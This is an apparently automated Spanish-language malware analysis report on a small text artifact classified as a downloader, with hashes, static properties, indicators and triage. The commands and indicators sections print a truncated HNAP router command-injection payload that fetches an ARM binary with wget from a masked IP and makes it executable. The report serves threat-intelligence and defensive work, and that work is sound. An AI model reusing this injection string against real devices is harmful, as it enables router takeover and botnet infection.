# 🧬 Payload Analysis

`3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 387 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `SetAccessPointMode` en `hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15`
- **SHA1:** `d02ac9de78a812f08d2f23fb935602caba28cc82`
- **MD5:** `3bd03ed412c209dd76a1290eefb83199`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 387 B |
| Entropía | 5.25 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
<IsAccessPoint>`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode | strings |
| ip | 201.51.13.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| command | <IsAccessPoint>`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai | strings |
| hash | 3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
